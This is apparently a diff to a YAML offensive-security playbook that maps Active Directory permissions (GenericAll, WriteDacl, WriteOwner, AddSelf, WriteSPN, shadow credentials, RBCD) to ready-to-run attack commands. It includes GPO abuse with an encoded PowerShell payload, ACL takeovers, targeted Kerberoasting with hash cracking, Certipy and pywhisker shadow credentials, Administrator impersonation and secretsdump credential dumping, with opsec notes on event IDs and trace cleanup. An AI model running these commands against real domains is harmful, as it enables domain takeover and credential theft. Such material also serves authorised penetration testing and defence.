@@ -65,6 +65,37 @@ GenericAll:
       - "GPO changes replicate to all DCs"
       - "Scheduled tasks visible in Task Scheduler"
 
+  OU:
+    description: "Full control over OU - link malicious GPO or modify child objects"
+    commands:
+      - name: "Link malicious GPO to OU"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<GPO_ID>' -command 'powershell.exe -enc <PAYLOAD>' -f
+      - name: "Create new GPO and link"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add gpLink '<TARGET_OU_DN>' '<GPO_DN>'
+      - name: "Modify inheritance on OU"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object '<TARGET>' --attr gPOptions -v 0
+    opsec:
+      - "GPO changes replicate to all DCs"
+      - "Changes affect all objects in OU"
+      - "OU modification creates Event ID 5136"
+
+  Container:
+    description: "Full control over container - modify child object permissions"
+    commands:
+      - name: "Grant GenericAll on container to affect child objects"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "Container ACL changes may inherit to child objects"
+      - "ACL modification creates Event ID 5136"
+
 GenericWrite:
   User:
     description: "Write properties - targeted Kerberoasting or logon script"
@@ -100,6 +131,27 @@ GenericWrite:
         tool: bloodyAD
         command: |
           bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object '<TARGET>' description -v 'Pwned'
+    opsec:
+      - "Property changes create Event ID 5136"
+
+  OU:
+    description: "Write properties on OU - link GPOs"
+    commands:
+      - name: "Link GPO to OU"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add gpLink '<TARGET_OU_DN>' '<GPO_DN>'
+    opsec:
+      - "GPO link changes affect all objects in OU"
+      - "Modification creates Event ID 5136"
+
+  Container:
+    description: "Write properties on container"
+    commands:
+      - name: "Modify container properties"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object '<TARGET>' description -v 'Modified'
     opsec:
       - "Property changes create Event ID 5136"
 
@@ -158,6 +210,31 @@ WriteDacl:
       - "DCSync creates Event ID 4662 with specific GUIDs"
       - "Highly visible attack"
 
+  OU:
+    description: "Modify OU ACL - grant yourself GenericAll to affect all child objects"
+    commands:
+      - name: "Grant GenericAll on OU"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+      - name: "Grant GenericAll with inheritance"
+        tool: Impacket
+        command: |
+          dacledit.py -action write -rights FullControl -inheritance -principal '<ATTACKER_USER>' -target '<TARGET>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+      - "Inheritance affects all child objects"
+
+  Container:
+    description: "Modify container ACL - grant yourself GenericAll"
+    commands:
+      - name: "Grant GenericAll on container"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+
 WriteOwner:
   User:
     description: "Take ownership then modify ACL"
@@ -190,6 +267,29 @@ WriteOwner:
           bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>' '<ATTACKER_USER>'
           bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add addMember '<TARGET>' '<ATTACKER_USER>'
           bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "Ownership change creates Event ID 5136"
+
+  OU:
+    description: "Take ownership of OU then modify ACL"
+    commands:
+      - name: "Take ownership and grant GenericAll"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "Ownership change creates Event ID 5136"
+      - "Can then modify OU to affect all child objects"
+
+  Container:
+    description: "Take ownership of container then modify ACL"
+    commands:
+      - name: "Take ownership and grant GenericAll"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>' '<ATTACKER_USER>'
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
     opsec:
       - "Ownership change creates Event ID 5136"
 
@@ -268,6 +368,16 @@ AllExtendedRights:
       - "DCSync creates Event ID 4662 with specific GUIDs"
       - "Highly visible, requires GetChanges and GetChangesAll"
 
+  OU:
+    description: "All extended rights on OU"
+    commands:
+      - name: "Execute extended rights operations on OU"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get children '<TARGET>' --type user
+    opsec:
+      - "Extended rights vary by object type"
+
 Owns:
   User:
     description: "Owner of user - modify ACL to gain full control"
@@ -299,3 +409,153 @@ Owns:
           bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember '<TARGET>' '<ATTACKER_USER>'
     opsec:
       - "ACL modification creates Event ID 5136"
+
+  OU:
+    description: "Owner of OU - modify ACL to affect child objects"
+    commands:
+      - name: "Grant yourself GenericAll on OU"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+      - "Inheritance affects all child objects in OU"
+
+  Container:
+    description: "Owner of container - modify ACL"
+    commands:
+      - name: "Grant yourself GenericAll on container"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+    opsec:
+      - "ACL modification creates Event ID 5136"
+
+AddSelf:
+  Group:
+    description: "AddSelf permission - can add yourself as member of this group"
+    commands:
+      - name: "Add yourself to group"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add groupMember '<TARGET>' '<USERNAME>'
+      - name: "Add yourself to group (net rpc)"
+        tool: net
+        command: |
+          net rpc group addmem '<TARGET>' '<USERNAME>' -U '<DOMAIN>/<USERNAME>%<PASSWORD>' -S <DC_IP>
+      - name: "Add yourself to group (PowerView)"
+        tool: PowerView
+        command: |
+          Add-DomainGroupMember -Identity '<TARGET>' -Members '<USERNAME>'
+    opsec:
+      - "Group membership change creates Event ID 4728/4732/4756"
+      - "Direct path to privilege escalation if group is privileged"
+
+WriteSPN:
+  User:
+    description: "WriteSPN permission - can set SPN for targeted Kerberoasting"
+    commands:
+      - name: "Set SPN on user (targeted Kerberoasting)"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> servicePrincipalName -v 'HTTP/<TARGET>'
+      - name: "Set SPN (setspn)"
+        tool: setspn
+        command: |
+          setspn -s HTTP/<TARGET> <DOMAIN>\<TARGET>
+      - name: "Request TGS for the new SPN"
+        tool: Impacket
+        command: |
+          GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+      - name: "Crack the hash"
+        tool: hashcat
+        command: |
+          hashcat -m 13100 tgs_hash.txt /path/to/wordlist.txt
+      - name: "Remove SPN after attack"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> servicePrincipalName
+    opsec:
+      - "SPN modification creates Event ID 5136"
+      - "Consider removing SPN after obtaining hash"
+      - "Kerberoasting creates Event ID 4769"
+
+  Computer:
+    description: "WriteSPN on computer - typically less useful"
+    commands:
+      - name: "Modify computer SPN"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object '<TARGET>$' servicePrincipalName -v 'HTTP/<TARGET>'
+    opsec:
+      - "Computer SPNs are typically expected and normal"
+      - "Modification still creates Event ID 5136"
+
+AddKeyCredentialLink:
+  User:
+    description: "Add shadow credentials to user for PKINIT authentication"
+    commands:
+      - name: "Add shadow credentials (Certipy)"
+        tool: Certipy
+        command: |
+          certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account <TARGET>
+      - name: "Add shadow credentials (pywhisker)"
+        tool: pywhisker
+        command: |
+          python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>' --action add --dc-ip <DC_IP>
+      - name: "Authenticate with generated certificate"
+        tool: Certipy
+        command: |
+          certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>
+      - name: "Clean up - remove shadow credentials"
+        tool: pywhisker
+        command: |
+          python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>' --action remove --device-id <DEVICE_ID> --dc-ip <DC_IP>
+    opsec:
+      - "Modifies msDS-KeyCredentialLink attribute (Event ID 5136)"
+      - "ADCS must be present for PKINIT authentication"
+      - "Consider removing after use"
+
+  Computer:
+    description: "Add shadow credentials to computer for PKINIT authentication"
+    commands:
+      - name: "Add shadow credentials (Certipy)"
+        tool: Certipy
+        command: |
+          certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET>$'
+      - name: "Add shadow credentials (pywhisker)"
+        tool: pywhisker
+        command: |
+          python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>$' --action add --dc-ip <DC_IP>
+      - name: "Authenticate with generated certificate"
+        tool: Certipy
+        command: |
+          certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>
+    opsec:
+      - "Modifies msDS-KeyCredentialLink attribute (Event ID 5136)"
+      - "ADCS must be present"
+      - "Can be used instead of RBCD attack"
+
+WriteAccountRestrictions:
+  Computer:
+    description: "Write account restrictions - can configure RBCD"
+    commands:
+      - name: "Configure RBCD (if MAQ allows computer creation)"
+        tool: Impacket
+        command: |
+          addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+          rbcd.py -delegate-to '<TARGET>$' -delegate-from 'YOURPC$' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+      - name: "Configure RBCD (with existing computer)"
+        tool: Impacket
+        command: |
+          rbcd.py -delegate-to '<TARGET>$' -delegate-from '<CONTROLLED_COMPUTER>$' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+      - name: "Get service ticket and access target"
+        tool: Impacket
+        command: |
+          getST.py -spn 'cifs/<TARGET>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/YOURPC$:Password123!'
+          export KRB5CCNAME=Administrator.ccache
+          secretsdump.py -k -no-pass <TARGET>
+    opsec:
+      - "RBCD configuration modifies msDS-AllowedToActOnBehalfOfOtherIdentity"
+      - "Computer account creation creates Event ID 4741"
+      - "Modification creates Event ID 5136"
